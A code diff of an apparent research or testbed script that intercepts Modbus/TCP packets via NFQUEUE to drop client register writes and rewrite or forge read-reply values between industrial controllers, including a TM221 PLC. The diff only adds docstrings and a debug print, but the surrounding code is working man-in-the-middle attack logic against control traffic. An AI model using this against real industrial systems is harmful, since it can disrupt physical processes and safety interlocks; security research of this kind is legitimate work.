@@ -165,9 +165,14 @@ CFG = {}
 # SMALL HELPERS
 # ==========================================================================
 def now_iso():
+    """
+    Return the current UTC time as an ISO 8601 string, for logging."""
+    
     return datetime.now(timezone.utc).isoformat()
 
 def log_event(rec):
+    
+    """"""
     # Record a manipulation (dropped/rewritten/injected). Bounded in size.
     if len(EVENTS) < MAX_LOG_EVENTS:
         EVENTS.append(rec)
@@ -183,12 +188,19 @@ def prune_pending(older_than=5.0):
         PENDING_READS.pop(k, None)
 
 
-# ==========================================================================
+
 # PACKET HANDLER — the core verdict logic. Called by NFQUEUE for every diverted
 # packet. Default action is ALWAYS accept (forward verbatim); we only drop or
 # rewrite the exact target transition while the window is open.
-# ==========================================================================
+
 def handle(packet):
+    """
+    NFQUEUE callback for each diverted packet. Accept, drop, or modify+accept.
+    
+    Args:
+        packet: netfilterqueue.Packet object representing the diverted packet.
+    """
+    
     try:
         _handle(packet)
     except Exception as exc:
@@ -202,6 +214,11 @@ def handle(packet):
 
 
 def _handle(packet):
+    """
+    Internal handler logic. Separated for exception isolation.  
+    """
+    print(f"[{now_iso()}] packet: {len(packet.get_payload())} bytes") #debug print
+    
     raw = packet.get_payload()          # IP-layer bytes of the forwarded packet
     pkt = IP(raw)
 
@@ -210,7 +227,7 @@ def _handle(packet):
         COUNTERS["passed"] += 1
         packet.accept(); return
 
-    tcp = pkt[TCP]
+    tcp = pkt[TCP] #TCP layer(transport) datagram
     load = bytes(pkt[Raw].load)
     if len(load) < 8:                   # too short to contain a full MBAP header
         COUNTERS["passed"] += 1
@@ -237,10 +254,10 @@ def _handle(packet):
         COUNTERS["passed"] += 1
         packet.accept(); return
 
-    # --------------------------------------------------------------------
+    #
     # WRITE-carrier transitions (T1 ready reg0=1, T4 ack reg1=2)
     # suppress = drop the client's write of the signal value.
-    # --------------------------------------------------------------------
+    # 
     if carrier == "write" and to_ab and fc in (FC_WRITE_SINGLE, FC_WRITE_MULTIPLE):
         wrote_signal, where = _write_sets_reg_to(load, fc, reg, signal)
         if wrote_signal:
@@ -257,14 +274,14 @@ def _handle(packet):
         COUNTERS["passed"] += 1
         packet.accept(); return
 
-    # ----------------------------------------------------------------------------------
+    # 
     # READ-REPLY-carrier transitions (T2 ack reg0=2, T3 ready reg1=1)
     # suppress = rewrite the register to a neutral value (default 0) so the
     #            client never sees the signal.
     # forge    = rewrite the register TO the signal value so the client sees a
     #            signal that was never set (T3 forge should be DEFEATED by the
     #            light barrier — we still perform it; TM221's logic refuses it).
-    # ------------------------------------------------------------------------------------
+    # 
    
     if carrier == "read_reply" and from_ab and fc == FC_READ_HOLDING and len(load) >= 9:
         byte_count = load[8]
